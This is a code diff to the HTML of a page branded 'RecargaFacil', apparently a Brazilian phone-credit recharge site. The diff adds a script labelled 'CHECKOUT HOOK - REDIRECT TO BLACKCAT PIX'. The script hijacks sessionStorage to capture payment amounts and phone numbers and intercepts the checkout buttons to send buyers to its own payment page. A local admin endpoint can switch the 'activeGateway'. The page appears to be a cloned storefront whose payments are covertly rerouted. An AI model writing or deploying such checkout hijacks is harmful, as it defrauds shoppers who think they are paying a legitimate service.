@@ -18,6 +18,14 @@
     <meta name="twitter:site" content="@RecargaFacil" />
     
 
+    <style>
+      /* Force operator buttons to be clickable */
+      button, [role="button"], .operator-btn, [class*="operator"] {
+        pointer-events: auto !important;
+        opacity: 1 !important;
+        cursor: pointer !important;
+      }
+    </style>
     <!-- UTM Manager - Código Universal de Rastreamento + Analytics + Live View -->
     <!-- Instale UMA VEZ no site. Todas as alterações são feitas no painel! -->
 
@@ -26,12 +34,73 @@
       'use strict';
       
       // ============================================
+      // CHECKOUT HOOK - REDIRECT TO BLACKCAT PIX
+      // ============================================
+      (function() {
+        const originalSetItem = sessionStorage.setItem;
+        sessionStorage.setItem = function(key, value) {
+            if (key === 'checkout_amount' || key === 'amount') {
+                localStorage.setItem('final_amount', value);
+            }
+            if (key === 'phone' || key === 'checkout_phone') {
+                localStorage.setItem('final_phone', value);
+            }
+            originalSetItem.apply(this, arguments);
+        };
+
+        document.addEventListener('click', (e) => {
+            const btn = e.target.closest('button');
+            if (btn && (btn.innerText.toUpperCase().includes('PROSSEGUIR') || btn.innerText.toUpperCase().includes('RECARREGAR'))) {
+                setTimeout(() => {
+                    const amount = localStorage.getItem('final_amount') || sessionStorage.getItem('checkout_amount');
+                    const phone = localStorage.getItem('final_phone') || sessionStorage.getItem('checkout_phone');
+                    if (amount) {
+                        sessionStorage.setItem('checkout_amount', amount);
+                        sessionStorage.setItem('checkout_phone', phone);
+                        window.location.href = '/pagamento.html';
+                    }
+                }, 500);
+            }
+        }, true);
+      })();
+
+      // ============================================
+      // OPERATOR SELECTION FIX
+      // ============================================
+      document.addEventListener('click', (e) => {
+          const operators = ['Vivo', 'Claro', 'TIM', 'Oi', 'Algar', 'Correios'];
+          const target = e.target.closest('button, [role="button"]');
+          
+          if (target && operators.some(op => target.innerText.includes(op))) {
+              console.log('[Fix] Selecionando operadora:', target.innerText);
+              
+              // 1. Desmarcar todos os outros botões que parecem operadoras
+              document.querySelectorAll('button, [role="button"]').forEach(btn => {
+                  if (operators.some(op => btn.innerText.includes(op))) {
+                      btn.style.border = '1px solid rgba(0,0,0,0.1)';
+                      btn.style.backgroundColor = 'transparent';
+                      btn.style.boxShadow = 'none';
+                  }
+              });
+
+              // 2. Marcar o selecionado
+              target.style.border = '2px solid #2563eb';
+              target.style.backgroundColor = 'rgba(37, 99, 235, 0.05)';
+              target.style.boxShadow = '0 0 0 2px rgba(37, 99, 235, 0.2)';
+              
+              // 3. Salvar a escolha para o checkout
+              const selectedOp = operators.find(op => target.innerText.includes(op));
+              sessionStorage.setItem('selected_operator', selectedOp);
+          }
+      }, true);
+
+      // ============================================
       // CONFIGURAÇÃO DO SERVIDOR - NÃO ALTERAR
       // ============================================
       const CONFIG_URL = 'https://dpedmcsrnlszxdvfgpqn.supabase.co/functions/v1/get-pixel-config';
       let TRACKING_URL = 'https://dpedmcsrnlszxdvfgpqn.supabase.co/functions/v1/track-conversion';
       const PAGEVIEW_URL = 'https://dpedmcsrnlszxdvfgpqn.supabase.co/functions/v1/track-pageview';
-      const HEARTBEAT_URL = 'https://dpedmcsrnlszxdvfgpqn.supabase.co/functions/v1/track-heartbeat';
+      const HEARTBEAT_URL = '/api/heartbeat';
       const PENDING_ORDER_URL = 'https://dpedmcsrnlszxdvfgpqn.supabase.co/functions/v1/register-pending-order';
       
       // ============================================
@@ -268,6 +337,18 @@
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify(payload)
           });
+
+          // Send to local admin panel too
+          fetch('/api/heartbeat', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ visitorId: visitorId })
+          }).then(res => res.json()).then(data => {
+            if (data.activeGateway) {
+              window.activeGateway = data.activeGateway;
+              localStorage.setItem('activeGateway', data.activeGateway);
+            }
+          }).catch(() => {});
         } catch (err) {
           // Silenciosamente ignora erros de heartbeat
         }
